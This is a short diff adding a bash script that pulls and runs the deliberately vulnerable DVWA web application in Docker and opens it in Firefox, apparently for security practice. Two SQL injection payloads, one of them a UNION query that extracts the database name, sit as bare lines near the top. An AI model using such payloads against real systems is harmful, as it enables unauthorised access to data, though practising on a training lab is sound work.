@@ -1,0 +1,10 @@
+#!/usr/bin/env bash
+' OR 1=1 #
+1' or 1=1 UNION SELECT 1,DATABASE() #
+
+
+
+sudo docker pull vulnerables/web-dvwa
+sudo docker run --rm -it -d -p 80:80 vulnerables/web-dvwa
+echo "firefox http://172.17.0.2"
+firefox http://172.17.0.2 &
